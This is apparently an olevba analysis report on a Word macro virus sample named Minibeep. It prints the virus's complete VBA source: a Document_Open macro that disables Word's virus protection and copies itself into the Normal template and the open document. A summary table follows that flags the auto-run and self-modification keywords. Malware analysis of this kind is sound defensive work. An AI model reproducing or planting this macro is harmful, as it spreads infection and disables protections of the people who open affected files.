olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Minibeep-de2f5ed245ce0ee14fe90ffdbec85c77beeea0f2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Minibeep-de2f5ed245ce0ee14fe90ffdbec85c77beeea0f2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
Options.VirusProtection = (Rnd * 0): Beep
If ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines <> NormalTemplate.VBProject.VBComponents(1).CodeModule.CountOfLines Then NormalTemplate.VBProject.VBComponents(1).CodeModule.AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 5)
If ThisDocument.VBProject.VBComponents(1).CodeModule.CountOfLines <> ActiveDocument.VBProject.VBComponents(1).CodeModule.CountOfLines Then ActiveDocument.VBProject.VBComponents(1).CodeModule.AddFromString ThisDocument.VBProject.VBComponents(1).CodeModule.Lines(1, 5)
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

